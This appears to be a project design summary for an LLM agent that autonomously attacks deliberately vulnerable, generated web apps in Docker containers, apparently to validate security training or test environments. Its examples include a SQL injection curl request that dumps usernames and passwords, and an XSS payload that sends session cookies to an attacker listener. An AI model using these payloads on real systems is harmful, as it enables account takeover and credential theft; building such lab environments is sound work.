# Phase 2: Attack Orchestrator for Custom Apps - Implementation Summary

## Overview
Phase 2 replaces the separate L1/L2/verdict/attack-agent chain with a unified Attack Orchestrator agent that autonomously validates custom web applications using three tools: exec_in_target, exec_in_attacker, and browser_task.

## What Was Implemented

### 1. Data Model Changes

**`GeneratedApp` (models.py)**
- ✅ Replaced `attack_snippet: str` with `attack_objective: str`
- ✅ Added `model_config = {"extra": "ignore"}` for backward compatibility with old checkpoints
- Attack objectives are structured natural language tasks with step prefixes:
  - "Run in attacker: <command>"
  - "In browser: <action>"
  - "Run in target: <command>"
  - "Success criterion: <observable>"

**`AttackOrchestratorResult` (models.py)**
- ✅ New model for orchestrator output:
  ```python
  class AttackOrchestratorResult(BaseModel):
      l1_passed: bool
      l2_passed: bool
      l1_evidence: str          # testing_snippet output
      l2_evidence: str          # attack execution output
      reasoning: str            # orchestrator's synthesis
      used_browser: bool = False
  ```

**`ResolvedCustomApp` (models.py)**
- ✅ Updated `attack_snippet` to default to `""` (deprecated field)

### 2. Agent & Task Configuration

**`attack_orchestrator_agent` (agents.yaml)**
- ✅ Role: Attack Orchestrator
- ✅ Three tools: exec_in_target, exec_in_attacker, browser_task
- ✅ Process:
  1. L1 check: run testing_snippet in target
  2. L2 exploit: execute attack_objective steps, routing to appropriate tools
  3. Validate success criterion
  4. Return structured result
- ✅ Backstory: Senior pentester adapting tools to attack type

**`attack_orchestrator_task` (tasks.yaml)**
- ✅ Description: Full app validation context (source, testing, objective, synthesis)
- ✅ Expected output: AttackOrchestratorResult JSON

**`generate_app_task` (tasks.yaml)**
- ✅ Updated to specify `attack_objective` format instead of `attack_snippet`
- ✅ Added examples for SQLi and XSS scenarios
- ✅ Expected output updated to include `attack_objective` instead of `attack_snippet`

**`app_generation_agent` (agents.yaml)**
- ✅ Updated goal to describe attack_objective format
- ✅ Added ATTACK OBJECTIVE FORMAT section with examples
- ✅ Updated rules to reference attack_objective

### 3. Attack Orchestrator Crew

**`crews/attack_orchestrator_crew.py`**
- ✅ New module implementing `run_attack_orchestrator_crew()`
- ✅ Creates bound tools pre-connected to specific containers:
  - `BoundExecInTargetTool(container_name)`
  - `BoundExecInAttackerTool(container_name)`
  - `BoundBrowserTool(cdp_url, target_base_url)`
- ✅ Handles JSON parsing with json_repair fallback
- ✅ Returns `AttackOrchestratorResult` or failure result on parse error
- ✅ Input sanitization via `_si()` to prevent SSTI

### 4. Custom App Flow Integration

**`steps/custom_app_flow.py`**
- ✅ Enabled browser for all custom app testing:
  ```python
  env = TestEnvironmentTool(target_image=target_image, enable_browser=True)
  ```
- ✅ Replaced entire L1+L2+verdict+attack-agent section (150+ lines) with single orchestrator call
- ✅ Removed dependencies on:
  - `_run_verdict_crew()`
  - `_run_attack_agent_crew()`
  - `MAX_ATTACK_RETRIES` loop
  - Separate L1/L2 execution logic
- ✅ Updated `emit_result()` to set `attack_snippet=""` (deprecated)
- ✅ Failure context updated to reference orchestrator evidence fields

### 5. What Was Removed

From `custom_app_flow.py`:
- ❌ `_run_verdict_crew()` calls for L1
- ❌ `_run_verdict_crew()` calls for L2  
- ❌ `_run_attack_agent_crew()` retry loop
- ❌ `MAX_ATTACK_RETRIES` attack agent attempts
- ❌ Separate L1 and L2 execution paths
- ❌ Attack snippet fixing logic

These were all consolidated into the orchestrator agent's autonomous tool selection and retry logic.

## How It Works

### Flow Overview
```
1. Deploy app in Docker container
2. Call run_attack_orchestrator_crew()
   └─> Orchestrator agent receives:
       - testing_snippet (L1 bash check)
       - attack_objective (L2 multi-step task)
       - Three tools (target, attacker, browser)
   └─> Agent executes L1 by calling exec_in_target
   └─> Agent parses attack_objective and routes each step:
       - "Run in attacker:" → exec_in_attacker
       - "In browser:" → browser_task
       - "Run in target:" → exec_in_target
   └─> Agent validates success criterion
   └─> Returns AttackOrchestratorResult
3. Check l1_passed and l2_passed
4. If either failed and attempts remain: regenerate app with failure context
5. If both passed: mark validated and emit ResolvedCustomApp
```

### Example: SQLi Attack Objective
```
Step 1: Run in attacker: curl -s "http://target:5000/search?q=x'+UNION+SELECT+username,password+FROM+users--+-"
Success criterion: response contains a bcrypt hash or plaintext credential
```

Orchestrator:
1. Calls `exec_in_attacker` with the curl command
2. Reads response
3. Checks if success criterion matches
4. Returns `l2_passed=True` if match found

### Example: XSS Cookie Theft Attack Objective
```
Step 1: Run in attacker: rm -f /tmp/exfil.txt && ncat -lnvp 9999 > /tmp/exfil.txt &
Step 2: In browser: navigate to http://target:3000/posts, fill comment with <script>new Image().src='http://attacker:9999/?c='+document.cookie</script>, submit
Step 3: In browser: navigate to http://target:3000/admin/review
Step 4: Run in attacker: sleep 15 && cat /tmp/exfil.txt
Success criterion: /tmp/exfil.txt contains connect.sid= or session=
```

Orchestrator:
1. Calls `exec_in_attacker` to start ncat listener
2. Calls `browser_task` with XSS injection instructions
3. Calls `browser_task` to trigger admin bot
4. Calls `exec_in_attacker` to check exfil file
5. Validates success criterion against file content

## Testing

### Unit Test
Phase 1 verification proved browser infrastructure works:
```bash
uv run python3 scripts/test_browser_phase1.py
```

### Integration Test
Test custom app generation with orchestrator:
```bash
# SQLi test (CLI-only, no browser)
uv run python3 scripts/test_custom_app.py \
  --vuln sqli_union \
  --goal credential_theft \
  --runtime flask

# XSS test (uses browser)
uv run python3 scripts/test_custom_app.py \
  --vuln xss_stored \
  --goal session_theft_via_xss \
  --runtime express
```

Expected behavior:
1. Generate app with attack_objective (not attack_snippet)
2. Start 3 containers: target, attacker, browser
3. Call Attack Orchestrator
4. Orchestrator routes steps to appropriate tools
5. Returns structured result with L1/L2 verdicts

## Benefits Over Old Approach

### Before (Phase 1)
```
L1 exec → Verdict LLM → if fail, regenerate
L2 exec → Verdict LLM → if fail:
  └─> Attack Agent (2 retries):
      └─> Exec probe → Verdict LLM → repeat
  └─> If still fail, regenerate
```

### After (Phase 2)
```
Deploy → Attack Orchestrator:
  └─> L1 check (exec_in_target)
  └─> L2 objective (routes steps to tools)
  └─> Returns structured verdict
If fail, regenerate with feedback
```

**Advantages:**
- ✅ Single agent decides tool selection (CLI vs browser)
- ✅ No separate verdict LLM calls (orchestrator judges inline)
- ✅ Browser capability integrated seamlessly
- ✅ Fewer agent roundtrips (4-6 LLM calls → 1-2)
- ✅ Cleaner failure context (single reasoning string)
- ✅ Orchestrator can retry within one invocation

## Files Modified/Created

### Created
- ✅ `src/game_of_everything/crews/__init__.py`
- ✅ `src/game_of_everything/crews/attack_orchestrator_crew.py`
- ✅ `docs/phase2_implementation_summary.md` (this file)

### Modified
- ✅ `src/game_of_everything/models.py` (GeneratedApp, AttackOrchestratorResult, ResolvedCustomApp)
- ✅ `src/game_of_everything/config/agents.yaml` (app_generation_agent, attack_orchestrator_agent)
- ✅ `src/game_of_everything/config/tasks.yaml` (generate_app_task, attack_orchestrator_task)
- ✅ `src/game_of_everything/steps/custom_app_flow.py` (validate_end_to_end, emit_result)

## What's Next (Phase 3)

Phase 3 will extend the Attack Agent pattern to misconfig atoms:
1. Create `crews/attack_crew.py` (shared attack agent)
2. Update `test_snippets.py` to use attack agent for L2 failures
3. Generalize `attack_agent` to handle infrastructure exploits (SSH, Samba, Redis)

Phase 3 is independent of Phase 2 — both can coexist.

## Current Status

✅ **Phase 2 implementation complete**
- All data models updated
- Agent/task configs updated
- Attack orchestrator crew created
- Custom app flow integrated
- Browser enabled for all custom apps
- Old L1/L2/verdict/attack-agent chain removed

⏳ **Pending: End-to-end testing**
- Run `test_custom_app.py` with real generation
- Verify attack_objective format is correct
- Verify orchestrator routes tools properly
- Verify browser_task works for XSS scenarios

The implementation is complete and ready for testing!
